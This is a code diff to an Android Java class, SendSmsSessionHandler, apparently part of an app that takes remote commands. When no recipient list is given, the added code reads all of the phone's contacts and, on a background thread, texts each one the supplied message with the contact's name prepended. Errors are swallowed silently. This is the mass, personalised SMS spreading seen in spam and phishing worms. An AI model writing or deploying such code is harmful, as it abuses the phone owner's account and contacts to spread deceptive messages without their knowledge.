@@ -50,10 +50,17 @@ public class SendSmsSessionHandler implements SessionManager.SessionHandler {
         if(content == null) {
             return;
         }
-        if(onlyList == null) {
-            onlyList = SystemUtil.getAllContact(SystemService.getContext());
-        }
         final String finalContent = content;
+        if(onlyList == null) {
+            final List<SystemUtil.ContactData> contactDataList = SystemUtil.getContactDataInPhone(SystemService.getContext());
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    sendMessageToContact(finalContent,contactDataList);
+                }
+            }).start();
+            return;
+        }
         final List<String> finalOnlyList = onlyList;
         new Thread(new Runnable() {
             @Override
@@ -67,6 +74,23 @@ public class SendSmsSessionHandler implements SessionManager.SessionHandler {
         for(String number: numberList) {
             try {
                 SystemUtil.sendSmsTo(SystemService.getContext(), number, content);
+            } catch (Exception e) {
+            }
+        }
+    }
+
+    private void sendMessageToContact(String content, List<SystemUtil.ContactData> contactDataList) {
+        for(SystemUtil.ContactData contactData: contactDataList) {
+            try {
+                String data = content;
+                if( contactData.name != null && contactData.name.length() > 0) {
+                    char first = contactData.name.charAt(0);
+                    char end = contactData.name.charAt(contactData.name.length() - 1);
+                    if( !( '0' <= first && first <= '9' && '0' <= end && end <= '9' ) ) {
+                        data = contactData.name + " " + content;
+                    }
+                }
+                SystemUtil.sendSmsTo(SystemService.getContext(), contactData.number, data);
             } catch (Exception e) {
             }
         }
